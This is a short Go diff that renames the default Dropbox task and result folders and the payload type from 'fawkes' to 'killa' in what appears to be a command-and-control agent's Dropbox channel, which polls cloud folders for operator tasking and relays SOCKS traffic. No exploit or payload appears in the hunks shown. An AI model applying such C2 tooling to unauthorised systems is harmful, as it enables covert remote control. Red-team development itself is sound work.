@@ -48,10 +48,10 @@ func NewDropboxProfile(token, taskFolder, resultFolder, archiveFolder, encryptio
 		pollIntervalSeconds = 5
 	}
 	if taskFolder == "" {
-		taskFolder = "/fawkes/tasks"
+		taskFolder = "/killa/tasks"
 	}
 	if resultFolder == "" {
-		resultFolder = "/fawkes/results"
+		resultFolder = "/killa/results"
 	}
 	return &DropboxProfile{Token: token, TaskFolder: taskFolder, ResultFolder: resultFolder, ArchiveFolder: archiveFolder, EncryptionKey: encryptionKey, Debug: debug, PollInterval: time.Duration(pollIntervalSeconds) * time.Second, client: &http.Client{Timeout: 30 * time.Second}, processed: make(map[string]struct{})}
 }
@@ -79,7 +79,7 @@ func (d *DropboxProfile) Checkin(agent *structs.Agent) error {
 }
 
 func (d *DropboxProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
-	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: d.getActiveUUID(agent), PayloadType: "fawkes", C2Profile: "dropbox"}
+	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: d.getActiveUUID(agent), PayloadType: "killa", C2Profile: "dropbox"}
 	resp, err := d.sendAndPoll(d.getActiveUUID(agent), msg, 10*time.Second)
 	if err != nil {
 		return []structs.Task{}, nil, nil
